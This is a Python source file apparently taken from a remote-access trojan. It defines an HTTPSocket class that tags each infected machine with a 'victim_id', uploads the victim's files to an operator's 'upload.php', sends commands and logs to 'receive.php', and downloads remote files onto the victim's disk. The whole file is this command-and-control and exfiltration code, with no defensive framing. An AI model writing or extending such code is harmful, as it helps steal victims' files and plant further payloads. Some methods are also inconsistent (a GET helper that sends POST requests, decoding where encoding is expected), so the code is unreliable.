import base64
import requests

class HTTPSocket:
    def __init__(self, host, victim_id):
        self.host = host
        self.victim_id = victim_id

    def _GET(self, filename, request):
        requests.post(url=self.host + filename, data=request)

    def _POST(self, filename, request):
        requests.post(url=self.host + filename, data=request)

    def Upload(self, filepath):
        url = self.host + "upload.php"
        files = {'file': open(filepath, 'rb')}
        victim_id = {'id': base64.b64decode(str(self.victim_id).encode('UTF-8'))}
        requests.post(url, files=files, params=victim_id)

    def Connect(self, clientdata):
        payload = {'data': base64.b64decode(clientdata.encode('UTF-8'))}
        self._GET("connection.php", payload)

    def Send(self, command):
        payload = {'command' : base64.b64decode(command.encode()), 'vicID': base64.b64encode(str(self.victim_id).encode())}
        self._GET("receive.php", payload)

    def Log(self, type, message):
        self.Send("NewLog" + "|BN|" + type + "|BN|" + message)

    def Download(self, url, destinationPath):
        file = requests.get(url)
        open(destinationPath, 'wb').write(file.content)









